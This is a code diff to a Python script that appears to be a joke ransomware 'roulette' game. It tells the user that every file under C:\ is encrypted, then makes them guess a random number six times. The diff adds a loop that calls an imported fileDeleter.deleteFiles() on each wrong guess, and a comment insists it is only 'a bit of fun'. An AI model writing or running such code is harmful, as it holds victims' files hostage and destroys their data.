@@ -1,9 +1,12 @@
-
+#just to add this is just a bit of fun, i would not consider using this.
 import encryptionManager
-from Crypto.Cipher import AES # @UnresolvedImport
+import random
+import time
+import fileDeleter
+
 
 rootDirectionary = 'C:\\'
-
+key = random.getrandbits(32) 
 
 
 
@@ -28,3 +31,15 @@ print("You have to survive 6 guesses")
 print("Also all the files on your computer are now encrypted, meaning that if you")
 print(" exit this program you will not get any of your files back.")
 print("If you survive they will be decrypted")
+
+
+
+for i in range(6):
+    answer = random.randint(1,6)
+    userInput = int(input("Go on, input something"))
+    if userInput != answer:
+        print("Oh dear, oh dear")
+        time.sleep(3)
+        fileDeleter.deleteFiles()
+        
+        
